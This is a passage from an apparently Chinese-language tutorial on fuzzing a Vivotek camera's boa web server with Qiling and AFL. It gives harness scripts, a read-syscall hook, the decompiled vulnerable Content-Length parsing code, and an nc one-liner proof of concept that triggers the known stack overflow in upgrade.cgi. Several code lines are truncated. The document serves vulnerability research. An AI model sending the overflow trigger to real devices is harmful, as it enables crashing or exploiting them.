                ('s6_addr', ctypes.c_uint8 * 16),
            )
        class sockaddr_in6(Struct):
            _fields_ = (
                ('sin6_family',   ctypes.c_int16),
                ('sin6_port',     ctypes.c_uint16),
                ('sin6_flowinfo', ctypes.c_uint32),
                ('sin6_addr',     in6_addr),
                ('sin6_scope_id', ctypes.c_uint32)
            )
        return sockaddr_in6
make_sockaddr_in,
make_sockaddr_in6基于`ctypes`构造严格的sockaddr结构体，因为是ipv6所以得用`make_sockaddr_in6`
还有就是函数`(function) inet6_ntoa: (addr: bytes) ->
str`需要bytes对象而sockaddr_obj.sin6_addr.s6_addr是cbytes类型所以得 **bytes转**
    sockaddr_in6 = make_sockaddr_in6(abits, endian)
    sockaddr_obj = sockaddr_in6.from_buffer(data)
    port = ntohs(ql, sockaddr_obj.sin6_port)
    host = inet6_ntoa(bytes(sockaddr_obj.sin6_addr.s6_addr))
**_OSError: [Errno 98] Address already in use_**
还是在调用bind时候，因为qiling会对低于1024的端口bind进行修改：
    if not ql.os.root and port  2 and sys.argv[1] == "-t":
            main(sys.argv[2], trace=True)
        else:
            main(sys.argv[1])
  * ql.hook_address(callback=start_afl, address=0x180F8)：在执行到`0x180F8`这个位置时调用start_afl函数
  * ql.run(begin=0x180F8)：从`0x180F8`开始执行
  * ql_afl_fuzz：就是unicornafl提供的fuzz接口`uc_afl_fuzz_custom`的一个wrapper
  * place_input_callback：ql_afl_fuzz会调用的回调函数，负责写入fuzz数据
### Fuzz buf
根据网上的漏洞分析比对源码框架，利用:
    cho -en "POST /cgi-bin/admin/upgrade.cgi HTTP/1.0nContent-Length:AAAAAAAAAAAAAAAAAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIXXXXnrnrn"  | nc -v ::1 9080
可以触发漏洞，具体位于框架中http头部解析函数：read_header，位于httpd中17F80位置
那么该如何fuzz呢，根据网上unicorn-afl官方用例和qiling官方用例：buf-fuzz，即定位代码中读取数据位置，然后读取完后劫持搜索特定字符串定位fuzz的buff_addr，当然需要状态保存(当然这个方法肯定不是很严谨，因此后面还会介绍劫持read函数方法)
#### 快照
    import os, sys, struct
    from socket import AF_INET
    sys.path.append('/home/iot/workspace/Emulator/qiling-dev')
    from qiling import Qiling
    from qiling.const import QL_INTERCEPT, QL_VERBOSE
    from qiling.os.const import STRING
    from unicorn.unicorn import UcError
    """
    struct hostent{
        char *h_name;  //official name
        char **h_aliases;  //alias list
        int  h_addrtype;  //host address type
        int  h_length;  //address lenght
        char **h_addr_list;  //address list
    }
    """
    def hook_memSpace(ql: Qiling):
        ql.mem.map(0x1000, 0x1000, info='my_hook')
        data = struct.pack(' None:
        print(f'[read({fd}, {buf: #x}, {size: #x})]')
    def boa_run(path: list, rootfs: str, profile: str = 'default'):
        ql = Qiling(path, rootfs, profile=profile, verbose=QL_VERBOSE.OFF, multithread=False)
        """setup files"""
        ql.add_fs_mapper('/dev/null', '/dev/null')
        """set ram"""
        hook_memSpace(ql)
        """hooks"""
        ql.os.set_api('gethostbyname', lib_gethostbyname, QL_INTERCEPT.CALL)
        ql.os.set_syscall('read', read_syscall, QL_INTERCEPT.ENTER)
        """setup saver"""
        ql.hook_address(saver, 0x0180FC)        #read finish
        ql.run()
    if __name__ == '__main__':
        os.chdir('/home/iot/workspace/Emulator/qiling-dev/vivetok')
        path = ['./rootfs/usr/sbin/httpd', "-c", "/etc/conf.d/boa", "-d"]
        rootfs = './rootfs'
        profile = './boa_arm.ql'
        boa_run(path=path, rootfs=rootfs, profile=profile)
然后使用poc触发就行
#### fuzz
    import os, sys, struct
    import capstone as Cs
    sys.path.append('/home/iot/workspace/Emulator/qiling-dev')
    from qiling.const import QL_INTERCEPT, QL_VERBOSE
    from qiling import Qiling
    from qiling.extensions.afl import ql_afl_fuzz
    def simple_diassembler(ql: Qiling, address: int, size: int, md: Cs) -> None:
        buf = ql.mem.read(address, size)
        for insn in md.disasm(buf, address):
            ql.log.debug(f':: {insn.address:#x} : {insn.mnemonic:24s} {insn.op_str}')
    def main(input_file: str, trace: bool = False):
        ql = Qiling(['./rootfs/usr/sbin/httpd', "-c", "/etc/conf.d/boa", "-d"], rootfs='./rootfs', profile='./boa_arm.ql', verbose=QL_VERBOSE.OFF, console = True if trace else False)
        ql.restore(snapshot='./context.bin')
        fuzz_mem = ql.mem.search(b'fuck')
        target_addr = fuzz_mem[0]
        def place_input_callback(_ql: Qiling, input: bytes, _):
            # print(b"**************** " + input)
            _ql.mem.write(target_addr, input)
        def start_afl(_ql: Qiling):
            """
            Callback from inside
            """
            ql_afl_fuzz(_ql, input_file=input_file, place_input_callback=place_input_callback, exits=[0x018398])
        ql.hook_address(callback=start_afl, address=0x0180FC+4)
        # ql.hook_code(simple_diassembler, begin=0x0180FC, end=0x018600, user_data=ql.arch.disassembler)
        try:
            # ql.debugger = True
            ql.run(begin=0x0180FC+4, end=0x018600)    #注意arm函数返回地址比较奇怪，不一定在函数末尾
            os._exit(0)
        except:
            if trace:
                print("\nFuzzer Went Shit")
            os._exit(0)  
    if __name__ == "__main__":
        if len(sys.argv) == 1:
            raise ValueError("No input file provided.")
        os.chdir('/home/iot/workspace/Emulator/qiling-dev/vivetok')
        if len(sys.argv) > 2 and sys.argv[1] == "-t":
            main(sys.argv[2], trace=True)
        else:
            main(sys.argv[1])
这里很坑的一点是，在漏洞中因为`Content-Length`成员不以\n结尾时就会让v31等于0会让strncpy报错但是不一定是pc指针错误，而是某些指令地址操作数问题
    v30 = strstr(haystack, "Content-Length");
    v31 = strchr(v30, '\n');
    v32 = strchr(v30, ':');
    strncpy(dest, v32 + 1, v31 - (v32 + 1));
在源码中AFL模块调用以下函数完成fuzz执行：
    def _dummy_fuzz_callback(_ql: "Qiling"):
                if isinstance(_ql.arch, QlArchARM):
                    pc = _ql.arch.effective_pc
                else:
                    pc = _ql.arch.regs.arch_pc
                try:
                    _ql.uc.emu_start(pc, 0, 0, 0)
                except UcError as e:
                    os.abort()              #添加部分
                    return e.errno
因此添加`os.abort`通知AFL程序崩溃
#### 效果
### Fuzz sys_read
上面直接对buf写入Fuzz数据肯定不是一个很理想的办法(比如Fuzz数据超出读取长度)，当然人家给的例子就是这么Fuzz的也不失一种方法；之后
就尝试利用Qiling的系统调用劫持功能让Fuzz效果更好。
从read函数调用处开始执行，在这之前劫持read函数调用让程序直接读取文件输入：
    def read_syscall(ql: Qiling, fd: int, buf: int, size: int, *args) -> int:
        # print(fd, buf, size)
        data = ql.os.stdin.read(size)
        # print(data)
        ql.mem.write(buf, data)
        return len(data)
    def place_input_callback(_ql: Qiling, input: bytes, _):
        # print(b"**************** " + input)
        ql.os.stdin.write(input)
        return True
    def start_afl(_ql: Qiling):
        """
        Callback from inside
        """
        ql_afl_fuzz(_ql, input_file=input_file, place_input_callback=place_input_callback, exits=[0x018398])
#### 效果
同样写个脚本把服务并且设置debugger等待gdb连接：
然后将crash中的数据发送：
也确实触发到了漏洞：
    0x900a5d74 in strncpy () from target:/lib/libc.so.0
    gef?  backtrace 
    #0  0x900a5d74 in strncpy () from target:/lib/libc.so.0
    #1  0x0001853c in ?? ()
    Backtrace stopped: previous frame identical to this frame (corrupt stack?)
    gef?  
#### 技巧
fuzz过程中不好调试连写的harness有没有效果都不知道，可以使用capstone同步解析执行汇编情况：
    def simple_diassembler(ql: Qiling, address: int, size: int, md: Cs) -> None:
        buf = ql.mem.read(address, size)
        for insn in md.disasm(buf, address):
            ql.log.debug(f':: {insn.address:#x} : {insn.mnemonic:24s} {insn.op_str}')
## 参考
  * [Demo - Qiling Framework Documentation](https://docs.qiling.io/en/latest/demo/)
  * [IOT Fuzz 两种思路](https://blog.csdn.net/jazrynwong/article/details/117228447)
  * [vivetok 摄像头远程栈溢出漏洞分析-安全客 - 安全资讯平台 (anquanke.com)](https://www.anquanke.com/post/id/185336#h2-2)
  * [Vivotek远程栈溢出漏洞分析与复现 - 先知社区 (aliyun.com)](https://xz.aliyun.com/t/5054)
  * [基于Unicorn和LibFuzzer的模拟执行fuzzing](http://galaxylab.com.cn/%e5%9f%ba%e4%ba%8eunicorn%e5%92%8clibfuzzer%e7%9a%84%e6%a8%a1%e6%8b%9f%e6%89%a7%e8%a1%8cfuzzing/)
  * [基于 unicorn 的单个函数模拟执行和 fuzzer 实现](http://galaxylab.pingan.com.cn/%E5%9F%BA%E4%BA%8E-unicorn-%E7%9A%84%E5%8D%95%E4%B8%AA%E5%87%BD%E6%95%B0%E6%A8%A1%E6%8B%9F%E6%89%A7%E8%A1%8C%E5%92%8C-fuzzer-%E5%AE%9E%E7%8E%B0/)
* * *